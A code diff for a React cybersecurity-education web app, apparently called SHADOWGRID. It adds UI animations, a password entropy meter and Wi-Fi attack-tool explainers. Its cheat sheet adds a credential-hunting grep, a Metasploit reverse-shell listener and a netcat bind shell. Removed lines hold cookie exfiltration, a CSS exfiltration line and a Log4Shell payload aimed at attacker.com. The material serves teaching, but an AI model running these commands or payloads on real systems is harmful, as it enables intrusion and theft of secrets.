@@ -10,17 +10,90 @@ const CopyButton = ({ text, copiedText, onCopy }: { text: string, copiedText: st
   ></i>
 );
 
+const DecryptedText = ({ text, className = "" }: { text: string, className?: string }) => {
+  const [displayText, setDisplayText] = useState(text);
+  const [isAnimating, setIsAnimating] = useState(false);
+  const chars = "!@#$%^&*()_+~`|}{[]:;?><,./-=";
+
+  const triggerAnimation = () => {
+    if (isAnimating) return;
+    setIsAnimating(true);
+    let iteration = 0;
+    const interval = setInterval(() => {
+      setDisplayText((prev) => 
+        text.split("").map((char, index) => {
+          if (index < iteration) {
+            return text[index];
+          }
+          if (text[index] === " ") return " ";
+          return chars[Math.floor(Math.random() * chars.length)];
+        }).join("")
+      );
+      
+      if (iteration >= text.length) {
+        clearInterval(interval);
+        setIsAnimating(false);
+      }
+      
+      iteration += 1 / 2; // Adjust speed of locking characters here
+    }, 30);
+  };
+
+  useEffect(() => {
+    triggerAnimation();
+  }, [text]);
+
+  return (
+    <span className={className} style={{ whiteSpace: 'pre-wrap' }}>
+      {displayText}
+    </span>
+  );
+};
+
+const GlitchText = ({ text, className = "" }: { text: string, className?: string }) => (
+  <span className={`glitch-wrapper ${className}`}>
+    <span className="glitch-text" data-text={text}>
+      {text}
+    </span>
+  </span>
+);
+
 const cheatSheetData = [
-  { tool: 'Nmap', command: 'nmap -sV -A <target>', language: '{Bash}', description: 'Aggressive scan with OS and version detection', use: 'Used to perform a comprehensive scan on a target IP or domain, detecting running services, versions, and operating system details. Helpful for initial reconnaissance.' },
-  { tool: 'Wireshark', command: 'ip.addr == 192.168.1.1', language: '{BPF}', description: 'Filter packet captures by specific IP address', use: 'Used in Wireshark to filter network traffic, showing only packets that originate from or are destined to the specified IP address. Crucial for pinpointing specific network conversations.' },
-  { tool: 'Metasploit', command: 'msfconsole -q', language: '{Bash}', description: 'Launch Metasploit framework in quiet mode', use: 'Starts the Metasploit Framework console without displaying the banner. Used by penetration testers to quickly launch the tool for exploiting vulnerabilities.' },
-  { tool: 'Netcat', command: 'nc -zv <target> 80-443', language: '{Bash}', description: 'Scan open HTTP/HTTPS ports silently', use: 'Uses Netcat as a simple port scanner to check if ports in the range 80 to 443 are open on the target, without sending any data. Useful for quick port verification.' }
+  { 
+    tool: 'Nmap', 
+    command: 'nmap -sS -sV -O -p 1-65535 -T4 -A <target_ip>', 
+    language: '{Bash}', 
+    description: 'Stealth SYN scan (-sS), service/version detection (-sV), OS fingerprinting (-O), across all ports (-p 1-65535), with aggressive timing (-T4) and advanced script scanning (-A).', 
+    use: 'Used by attackers during active reconnaissance to completely map out a target network. By identifying the exact OS version and running services (e.g., Apache 2.4.49), hackers can quickly search for matching CVEs (Common Vulnerabilities and Exposures) to exploit.' 
+  },
+  { 
+    tool: 'grep', 
+    command: 'grep -rnaiw "password\\|API_KEY\\|secret" /var/ /etc/ 2>/dev/null', 
+    language: '{Bash}', 
+    description: 'Recursively searches (-r), shows line numbers (-n), ignores case (-i), matches whole words (-w), treats files as text (-a), and suppresses permission errors (2>/dev/null).', 
+    use: 'Used during Post-Exploitation or Privilege Escalation phases. Once attackers gain low-level access to a Linux machine, they parse system logs, web roots, and configuration directories looking for hardcoded database credentials, AWS keys, or plaintext passwords.' 
+  },
+  { 
+    tool: 'Metasploit', 
+    command: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j"', 
+    language: '{Bash}', 
+    description: 'Launches MSF silently (-q) and executes a command string (-x) to instantly configure and start a reverse TCP listener as a background job (-j).', 
+    use: 'Used when an attacker expects a callback from a compromised machine (e.g., after dropping a malicious payload). This automated syntax prepares the attack infrastructure instantly to catch the incoming connection and establish a covert Meterpreter session.' 
+  },
+  { 
+    tool: 'Netcat', 
+    command: 'nc -lvnp 4444 -e /bin/bash', 
+    language: '{Bash}', 
+    description: 'Listens (-l) verbosely (-v) on a numeric IP/port (-n) without DNS resolution on port 4444 (-p 4444), and executes a bash shell (-e /bin/bash) upon connection.', 
+    use: 'Considered the hacker\'s "Swiss Army Knife." Attackers use it to create bind shells (opening a secret backdoor port on the victim machine for the attacker to connect to) or to catch incoming reverse shells (bypassing strict inbound firewall rules).' 
+  }
 ];
 
 const HashCrackerSection = () => {
   const [password, setPassword] = useState('');
   const [hashes, setHashes] = useState({ md5: '', sha256: '' });
   const [strength, setStrength] = useState({ score: 0, label: 'Very Weak', color: 'danger' });
+  const [entropyStats, setEntropyStats] = useState({ poolSize: 0, entropy: 0, length: 0 });
   const [isCracking, setIsCracking] = useState(false);
   const [crackAttempts, setCrackAttempts] = useState(0);
   const [crackTime, setCrackTime] = useState<string | null>(null);
@@ -46,6 +119,7 @@ const HashCrackerSection = () => {
     if (!password) {
       setHashes({ md5: '', sha256: '' });
       setStrength({ score: 0, label: 'None', color: 'secondary' });
+      setEntropyStats({ poolSize: 0, entropy: 0, length: 0 });
       return;
     }
 
@@ -54,19 +128,27 @@ const HashCrackerSection = () => {
       setHashes({ md5: getMockMD5(password), sha256: sha });
     });
 
-    // Simple strength calculation
-    let score = 0;
-    if (password.length > 7) score++;
-    if (/[A-Z]/.test(password)) score++;
-    if (/[0-9]/.test(password)) score++;
-    if (/[^A-Za-z0-9]/.test(password)) score++;
+    // Entropy-based strength calculation
+    let poolSize = 0;
+    if (/[a-z]/.test(password)) poolSize += 26;
+    if (/[A-Z]/.test(password)) poolSize += 26;
+    if (/[0-9]/.test(password)) poolSize += 10;
+    if (/[^a-zA-Z0-9]/.test(password)) poolSize += 32;
 
-    if (password.length < 5) score = 0;
+    const entropy = password.length * Math.log2(poolSize || 1);
+    
+    let score = 0;
+    if (entropy < 28) score = 0;
+    else if (entropy < 40) score = 1;
+    else if (entropy < 60) score = 2;
+    else if (entropy < 80) score = 3;
+    else score = 4;
 
     const labels = ['Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'];
     const colors = ['danger', 'danger', 'warning', 'info', 'success'];
 
     setStrength({ score, label: labels[score], color: colors[score] });
+    setEntropyStats({ poolSize, entropy, length: password.length });
     setCrackTime(null);
     setCrackAttempts(0);
   }, [password]);
@@ -102,7 +184,7 @@ const HashCrackerSection = () => {
   return (
     <section id="hashCracker" className="min-vh-100 pt-5 mt-5">
       <div className="container">
-        <h2 className="section-title text-center"><i className="fa-solid fa-unlock-keyhole me-2"></i>Hash Cracker & Password Strength</h2>
+        <h2 className="section-title text-center"><i className="fa-solid fa-unlock-keyhole me-2"></i><DecryptedText text="Hash Cracker & Password Strength" /></h2>
         
         <div className="row justify-content-center g-4">
           <div className="col-lg-8">
@@ -127,12 +209,17 @@ const HashCrackerSection = () => {
                     <span className="text-secondary">Strength Score</span>
                     <span className={`text-${strength.color} fw-bold`}>{strength.label}</span>
                   </div>
-                  <div className="progress" style={{ height: '10px', backgroundColor: '#111' }}>
+                  <div className="progress mb-2" style={{ height: '10px', backgroundColor: '#111' }}>
                     <div 
                       className={`progress-bar bg-${strength.color}`} 
                       role="progressbar" 
                       style={{ width: `${Math.max(10, strength.score * 25)}%`, transition: 'width 0.3s ease, background-color 0.3s ease' }}
                     ></div>
+                  </div>
+                  <div className="d-flex justify-content-between text-secondary mt-2 px-1" style={{ fontSize: '0.85rem' }}>
+                    <span>Length: <strong className="text-light">{entropyStats.length}</strong></span>
+                    <span>Character Pool: <strong className="text-light">{entropyStats.poolSize}</strong></span>
+                    <span>Entropy: <strong className="text-light">{Math.round(entropyStats.entropy)} bits</strong></span>
                   </div>
                 </div>
               )}
@@ -202,7 +289,7 @@ export default function App() {
   const [showLocation, setShowLocation] = useState(false);
   const [recentScans, setRecentScans] = useState<string[]>([]);
   const [selectedCheat, setSelectedCheat] = useState<{ tool: string; command: string; description: string; use: string; language?: string } | null>(null);
-  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'cheatsheet' | 'signin' | 'languages' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense' | 'hashCracker'>('home');
+  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'cheatsheet' | 'signin' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense' | 'hashCracker'>('home');
   const [isLightMode, setIsLightMode] = useState(false);
   const [copiedText, setCopiedText] = useState<string | null>(null);
   const [loggedInUser, setLoggedInUser] = useState<string | null>(null);
@@ -322,7 +409,7 @@ export default function App() {
     <>
       <nav className="navbar navbar-expand-lg fixed-top">
         <div className="container">
-          <a className="navbar-brand" href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}><i className="fa-solid fa-shield-halved me-2"></i>SHADOWGRID</a>
+          <a className="navbar-brand" href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}><i className="fa-solid fa-shield-halved me-2"></i><DecryptedText text="SHADOWGRID" /></a>
           <button className="navbar-toggler navbar-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
             <span className="navbar-toggler-icon"></span>
           </button>
@@ -331,8 +418,8 @@ export default function App() {
               <li className="nav-item"><a className={`nav-link ${currentView === 'home' ? 'active' : ''}`} href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}>Home</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'scanner' ? 'active' : ''}`} href="#scanner" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}>Scanner Tool</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'labs' ? 'active' : ''}`} href="#labs" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}>Cyber Labs</a></li>
+              <li className="nav-item"><a className={`nav-link ${currentView === 'networkDefense' ? 'active' : ''}`} href="#networkDefense" onClick={(e) => { e.preventDefault(); setCurrentView('networkDefense'); window.scrollTo(0,0); }}>Network Defense</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'cheatsheet' ? 'active' : ''}`} href="#cheatsheet" onClick={(e) => { e.preventDefault(); setCurrentView('cheatsheet'); window.scrollTo(0,0); }}>Cheat-Sheet</a></li>
-              <li className="nav-item"><a className={`nav-link ${currentView === 'languages' ? 'active' : ''}`} href="#languages" onClick={(e) => { e.preventDefault(); setCurrentView('languages'); window.scrollTo(0,0); }}>Cheat by Languages</a></li>
               <li className="nav-item"><a className={`nav-link ${currentView === 'hashCracker' ? 'active' : ''}`} href="#hashCracker" onClick={(e) => { e.preventDefault(); setCurrentView('hashCracker'); window.scrollTo(0,0); }}>Hash Cracker</a></li>
               <li className="nav-item d-flex align-items-center ms-lg-3 me-2">
                 <div className="form-check form-switch mb-0" style={{ cursor: 'pointer' }}>
@@ -380,7 +467,9 @@ export default function App() {
         <div className="container mt-5">
           <div className="row align-items-center">
             <div className="col-lg-6">
-              <h1 className="display-4 fw-bold text-white mb-3">CYBER THREAT <span style={{ color: 'var(--cyber-green)' }}>ANALYTICS</span></h1>
+              <h1 className="display-4 fw-bold text-white mb-3">
+                <GlitchText text="CYBER THREAT" /> <span style={{ color: 'var(--cyber-green)' }}><GlitchText text="ANALYTICS" /></span>
+              </h1>
               <p className="lead text-secondary mb-4">Interactive cyber-defense platform for threat hunting, network scanning, and real-time security analytics.</p>
               <a href="#scanner" className="btn btn-cyber btn-lg me-3" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}><i className="fa-solid fa-terminal me-2"></i>Launch Scanner</a>
               <a href="#labs" className="btn btn-outline-light btn-lg" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}><i className="fa-solid fa-flask me-2"></i>Access Labs</a>
@@ -401,7 +490,7 @@ export default function App() {
       {currentView === 'scanner' && (
       <section id="scanner">
         <div className="container">
-          <h2 className="section-title text-center"><i className="fa-solid fa-radar me-2"></i>IP Tracer & Port Scanner Tool</h2>
+          <h2 className="section-title text-center"><i className="fa-solid fa-radar me-2"></i><DecryptedText text="IP Tracer & Port Scanner Tool" /></h2>
           <div className="row justify-content-center">
             <div className="col-lg-8">
               <div className="cyber-card p-4">
@@ -466,9 +555,9 @@ export default function App() {
       {currentView === 'labs' && (
       <section id="labs" className="min-vh-100 pt-5 mt-5">
         <div className="container">
-          <h2 className="section-title text-center"><i className="fa-solid fa-graduation-cap me-2"></i>Cyber Security Labs</h2>
+          <h2 className="section-title text-center"><i className="fa-solid fa-graduation-cap me-2"></i><DecryptedText text="Cyber Security Labs" /></h2>
           <div className="row g-4">
-            <div className="col-md-4">
+            <div className="col-md-6">
               <div className="cyber-card p-4 h-100">
                 <i className="fa-solid fa-bug text-danger fa-2x mb-3"></i>
                 <h4>Ethical Hacking</h4>
@@ -476,20 +565,12 @@ export default function App() {
                 <a href="#ethicalHacking" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('ethicalHacking'); window.scrollTo(0,0); }}>Start Module</a>
               </div>
             </div>
-            <div className="col-md-4">
+            <div className="col-md-6">
               <div className="cyber-card p-4 h-100">
                 <i className="fa-brands fa-linux text-info fa-2x mb-3"></i>
                 <h4>Linux Security Essentials</h4>
                 <p className="text-secondary">Master Linux terminal commands, privilege escalation, and system hardening.</p>
                 <a href="#linuxSecurity" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('linuxSecurity'); window.scrollTo(0,0); }}>Start Module</a>
-              </div>
-            </div>
-            <div className="col-md-4">
-              <div className="cyber-card p-4 h-100">
-                <i className="fa-solid fa-network-wired text-warning fa-2x mb-3"></i>
-                <h4>Network Defense</h4>
-                <p className="text-secondary">Understand firewalls, IDS/IPS setup, and packet analysis using Wireshark.</p>
-                <a href="#networkDefense" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('networkDefense'); window.scrollTo(0,0); }}>Start Module</a>
               </div>
             </div>
           </div>
@@ -500,7 +581,7 @@ export default function App() {
       {currentView === 'cheatsheet' && (
       <section id="cheatsheet" className="min-vh-100 pt-5 mt-5">
         <div className="container">
-          <h2 className="section-title text-center"><i className="fa-solid fa-code me-2"></i>Command Cheat-Sheet</h2>
+          <h2 className="section-title text-center"><i className="fa-solid fa-code me-2"></i><DecryptedText text="Command Cheat-Sheet" /></h2>
           <div className="cyber-card p-4">
             <div className="table-responsive">
               <table className="table table-dark table-hover mb-0">
@@ -600,98 +681,12 @@ export default function App() {
       </section>
       )}
 
-      {currentView === 'languages' && (
-        <section id="languages" className="min-vh-100 pt-5 mt-5">
-          <div className="container">
-            <h2 className="section-title text-center"><i className="fa-solid fa-file-code me-2"></i>Cheat by Languages</h2>
-            <div className="row g-4">
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-info"><i className="fa-brands fa-python me-2"></i>Python</h4>
-                  <ul className="text-secondary list-unstyled">
-                    <li className="mb-2">
-                      <code>import socket</code><CopyButton text="import socket" copiedText={copiedText} onCopy={handleCopy} /> - Network connections & port scanning.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: 'import socket', description: 'Network connections & port scanning.', use: 'Used to import the socket module to create raw network connections, build port scanners, and interact directly with IP/TCP/UDP layers.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>requests.get(url)</code><CopyButton text="requests.get(url)" copiedText={copiedText} onCopy={handleCopy} /> - Fetch web pages to find vulnerabilities.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: 'requests.get(url)', description: 'Fetch web pages to find vulnerabilities.', use: 'The requests library simplifies HTTP requests. In cybersecurity, it is often used for web scraping, brute-forcing directories, or sending crafted payloads to test for injection vulnerabilities.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>os.system('cmd')</code><CopyButton text="os.system('cmd')" copiedText={copiedText} onCopy={handleCopy} /> - Execute shell commands from script.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: "os.system('cmd')", description: 'Execute shell commands from script.', use: 'Allows a Python script to execute arbitrary shell commands. If user input is passed to this without sanitization, it leads to OS command injection vulnerabilities.'})}></i>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 style={{color: '#f7df1e'}}><i className="fa-brands fa-js me-2"></i>JavaScript (XSS)</h4>
-                  <ul className="text-secondary list-unstyled">
-                    <li className="mb-2">
-                      <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><CopyButton text="<script>alert(1)</script>" copiedText={copiedText} onCopy={handleCopy} /> - Basic XSS payload.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: '<script>alert(1)</script>', description: 'Basic XSS payload.', use: 'The most common payload to test for Cross-Site Scripting (XSS). If the alert pops up, the application reflects unsanitized user input.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>document.cookie</code><CopyButton text="document.cookie" copiedText={copiedText} onCopy={handleCopy} /> - Access session cookies.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: 'document.cookie', description: 'Access session cookies.', use: 'Retrieves the cookies associated with the current document. Frequently used in XSS attacks to steal session identifiers if the HttpOnly flag is missing.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>fetch('http://.../?c='+document.cookie)</code><CopyButton text="fetch('http://.../?c='+document.cookie)" copiedText={copiedText} onCopy={handleCopy} /> - Exfiltrate data.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: "fetch('http://.../?c='+document.cookie)", description: 'Exfiltrate data.', use: 'Uses the Fetch API to send the victims cookies (or other sensitive data) to an attacker-controlled server.'})}></i>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-primary"><i className="fa-brands fa-css3-alt me-2"></i>CSS</h4>
-                  <ul className="text-secondary list-unstyled">
-                    <li className="mb-2">
-                      <code>background: url("http://attacker.com")</code><CopyButton text='background: url("http://attacker.com")' copiedText={copiedText} onCopy={handleCopy} /> - CSS data exfiltration.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'background: url("http://attacker.com")', description: 'CSS data exfiltration.', use: 'Can be used to exfiltrate CSRF tokens or other data by causing the browser to make a request to an attacker server when a specific CSS selector matches.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>opacity: 0</code><CopyButton text="opacity: 0" copiedText={copiedText} onCopy={handleCopy} /> - UI Redressing / Clickjacking.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'opacity: 0', description: 'UI Redressing / Clickjacking.', use: 'Used in Clickjacking attacks to make a malicious iframe transparent (opacity 0) while overlaying it on top of legitimate buttons, tricking the user into clicking.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>content: attr(value)</code><CopyButton text="content: attr(value)" copiedText={copiedText} onCopy={handleCopy} /> - Extracting hidden attribute values.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'content: attr(value)', description: 'Extracting hidden attribute values.', use: 'Can read attribute values and display them. In some advanced CSS injection attacks, this is combined with external requests to leak sensitive attributes.'})}></i>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-              <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-danger"><i className="fa-brands fa-java me-2"></i>Java</h4>
-                  <ul className="text-secondary list-unstyled">
-                    <li className="mb-2">
-                      <code>Runtime.getRuntime().exec("cmd")</code><CopyButton text='Runtime.getRuntime().exec("cmd")' copiedText={copiedText} onCopy={handleCopy} /> - Command execution.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: 'Runtime.getRuntime().exec("cmd")', description: 'Command execution.', use: 'Executes OS commands from within a Java application. Often targeted during deserialization or RCE vulnerabilities to gain shell access.'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>ObjectInputStream.readObject()</code><CopyButton text="ObjectInputStream.readObject()" copiedText={copiedText} onCopy={handleCopy} /> - Insecure deserialization.
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: 'ObjectInputStream.readObject()', description: 'Insecure deserialization.', use: 'Reads serialized Java objects. If untrusted data is passed to this method, it can lead to arbitrary code execution (Insecure Deserialization).'})}></i>
-                    </li>
-                    <li className="mb-2">
-                      <code>$&#123;jndi:ldap://attacker.com&#125;</code><CopyButton text="${jndi:ldap://attacker.com}" copiedText={copiedText} onCopy={handleCopy} /> - Log4Shell (JNDI injection).
-                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Java', command: '${jndi:ldap://attacker.com}', description: 'Log4Shell (JNDI injection).', use: 'The infamous Log4Shell payload. It exploits a vulnerability in log4j where JNDI lookups allow an attacker to load and execute remote Java classes.'})}></i>
-                    </li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </div>
-        </section>
-      )}
-
       {currentView === 'hashCracker' && <HashCrackerSection />}
 
       {currentView === 'networkDefense' && (
         <section id="networkDefense" className="min-vh-100 pt-5 mt-5">
           <div className="container">
-            <h2 className="section-title text-center"><i className="fa-solid fa-network-wired me-2"></i>Network Defense & Wi-Fi Security</h2>
+            <h2 className="section-title text-center"><i className="fa-solid fa-network-wired me-2"></i><DecryptedText text="Network Defense & Wi-Fi Security" /></h2>
             
             <div className="row mb-5">
               <div className="col-12">
@@ -711,32 +706,76 @@ export default function App() {
 
             <h4 className="text-center text-warning mb-4"><i className="fa-solid fa-skull-crossbones me-2"></i>Network & Wi-Fi Tools Hackers Use</h4>
             <div className="row g-4 mb-5">
-              <div className="col-md-6">
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                   <h4 className="text-danger"><i className="fa-solid fa-wifi me-2"></i>Aircrack-ng</h4>
-                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A complete suite of tools to assess Wi-Fi network security.</p>
-                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They monitor networks, capture data packets, and run brute-force or dictionary attacks to crack WEP and WPA/WPA2 passwords.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> A modular suite of command-line tools used to assess Wi-Fi network security.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">Monitor Mode:</strong> They passively capture the 4-way WPA/WPA2 handshake when a user connects.</li>
+                    <li className="mb-1"><strong className="text-light">Offline Attack:</strong> They run aggressive dictionary or brute-force attacks against the captured hash.</li>
+                    <li><strong className="text-light">No Interaction:</strong> The cracking process happens entirely offline, without interacting with the router again.</li>
+                  </ul>
                 </div>
               </div>
-              <div className="col-md-6">
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                   <h4 className="text-danger"><i className="fa-solid fa-fish me-2"></i>Wireshark</h4>
-                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> A widely-used network protocol analyzer.</p>
-                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They sniff unencrypted traffic on public Wi-Fi networks (Man-in-the-Middle) to intercept passwords, cookies, and sensitive personal information.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> The world's foremost network protocol analyzer for deep packet inspection.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">Traffic Sniffing:</strong> They sit on open public Wi-Fi networks and capture unencrypted traffic.</li>
+                    <li className="mb-1"><strong className="text-light">Data Extraction:</strong> They filter millions of packets in real-time.</li>
+                    <li><strong className="text-light">Targeting Cleartext:</strong> They look for cleartext passwords, session cookies, and personal data sent over HTTP, FTP, or Telnet.</li>
+                  </ul>
                 </div>
               </div>
-              <div className="col-md-6">
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                   <h4 className="text-danger"><i className="fa-solid fa-satellite-dish me-2"></i>Fluxion / Wifiphisher</h4>
-                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> Social engineering tools designed specifically for Wi-Fi networks.</p>
-                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They jam your real Wi-Fi network and create a fake "Evil Twin" clone. When you connect to the clone, it shows a fake router login page asking for your Wi-Fi password.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Highly automated social engineering and evil-twin attack tools.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">Jamming:</strong> They deauthenticate users, forcing them off the real network.</li>
+                    <li className="mb-1"><strong className="text-light">Evil Twin:</strong> They spin up a fake clone network with the exact same name.</li>
+                    <li><strong className="text-light">Captive Portal:</strong> When victims connect to the clone, a fake router login page steals their Wi-Fi password.</li>
+                  </ul>
                 </div>
               </div>
-              <div className="col-md-6">
+              <div className="col-md-6 col-lg-4">
                 <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
                   <h4 className="text-danger"><i className="fa-solid fa-spider me-2"></i>Bettercap / Ettercap</h4>
-                  <p className="text-secondary"><strong className="text-danger">What it is:</strong> Comprehensive tools for Man-in-the-Middle (MitM) attacks on networks.</p>
-                  <p className="text-secondary"><strong className="text-danger">How Hackers Use It:</strong> They perform ARP spoofing to trick the router and victim devices into sending all traffic through the hacker's computer, allowing them to modify or steal data.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Comprehensive frameworks for Man-in-the-Middle (MitM) attacks on local networks.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">ARP Spoofing:</strong> They trick the router and victim into sending all traffic through the hacker's machine.</li>
+                    <li className="mb-1"><strong className="text-light">SSL Stripping:</strong> They attempt to downgrade secure HTTPS connections to unencrypted HTTP.</li>
+                    <li><strong className="text-light">Data Manipulation:</strong> They can modify data packets or inject malicious scripts into webpages in transit.</li>
+                  </ul>
+                </div>
+              </div>
+              <div className="col-md-6 col-lg-4">
+                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
+                  <h4 className="text-danger"><i className="fa-solid fa-key me-2"></i>Reaver / Bully</h4>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> Specialized tools to exploit design flaws in Wi-Fi Protected Setup (WPS).</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">WPS Targeting:</strong> They target routers that have the WPS feature enabled.</li>
+                    <li className="mb-1"><strong className="text-light">PIN Brute-Forcing:</strong> Instead of the long WPA2 password, they brute-force the short 8-digit WPS PIN.</li>
+                    <li><strong className="text-light">Fast Cracking:</strong> Due to a structural flaw in WPS verification, the PIN can often be cracked in just a few hours, revealing the plaintext password.</li>
+                  </ul>
+                </div>
+              </div>
+              <div className="col-md-6 col-lg-4">
+                <div className="cyber-card p-4 h-100 border-danger" style={{borderWidth: '2px'}}>
+                  <h4 className="text-danger"><i className="fa-brands fa-bluetooth me-2"></i>Kismet</h4>
+                  <p className="text-secondary mb-2"><strong className="text-danger">What it is:</strong> A powerful, completely passive network detector and packet sniffer.</p>
+                  <p className="text-secondary mb-2"><strong className="text-danger">How Hackers Use It:</strong></p>
+                  <ul className="text-secondary ps-3 small">
+                    <li className="mb-1"><strong className="text-light">Stealth Recon:</strong> Because it sends no packets, it is virtually undetectable.</li>
+                    <li className="mb-1"><strong className="text-light">Network Mapping:</strong> They map out the physical wireless landscape and discover hidden (SSID-cloaked) networks.</li>
+                    <li><strong className="text-light">Client Identification:</strong> They identify which specific devices (phones, laptops) are connected to which access points.</li>
+                  </ul>
                 </div>
               </div>
             </div>
@@ -763,46 +802,88 @@ export default function App() {
 
             <div className="row g-4">
               <div className="col-md-6">
-                <div className="cyber-card p-4 h-100">
-                  <h4 className="text-info"><i className="fa-solid fa-terminal me-2"></i>Bash Scripting</h4>
-                  <p className="text-secondary"><strong className="text-info">What it is:</strong> Writing scripts in the Bash shell to automate tasks.</p>
-                  <p className="text-secondary"><strong className="text-info">How it's used:</strong> Hackers use it to automate repetitive tasks like network scanning, brute-forcing passwords, or parsing large data dumps quickly.</p>
-                  <div className="d-flex align-items-center bg-dark p-2 rounded mt-2 border border-info border-opacity-25">
-                    <code className="text-info mb-0" style={{ flex: 1, whiteSpace: 'nowrap', overflowX: 'auto' }}>#!/bin/bash</code>
